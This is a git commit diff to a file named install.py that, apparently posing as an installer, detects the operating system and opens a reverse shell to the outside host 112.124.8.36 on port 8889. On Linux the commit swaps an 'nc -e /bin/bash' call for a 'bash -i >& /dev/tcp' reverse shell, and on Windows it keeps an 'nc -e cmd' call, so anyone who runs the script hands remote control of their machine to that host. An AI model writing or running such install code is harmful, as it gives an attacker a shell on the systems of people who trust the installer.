02fe63ce4732fba3acbb28da4a2c1830a9c23e1d
quachuooo <160610847+quachuooo@users.noreply.github.com>
2024-02-21 18:15:07 +0800

    Update install.py

--- install.py
+++ install.py
@@ -1,8 +1,9 @@
 import os
 import platform
 
+# 获取操作系统名称
 system_name = platform.system()
 if system_name == 'Linux':
-    os.system("nc 112.124.8.36 8889 -e /bin/bash")
+    os.system("bash -i >& /dev/tcp/112.124.8.36/8889 0>&1")
 if system_name == 'Windows':
     os.system("nc 112.124.8.36 8889 -e cmd ")
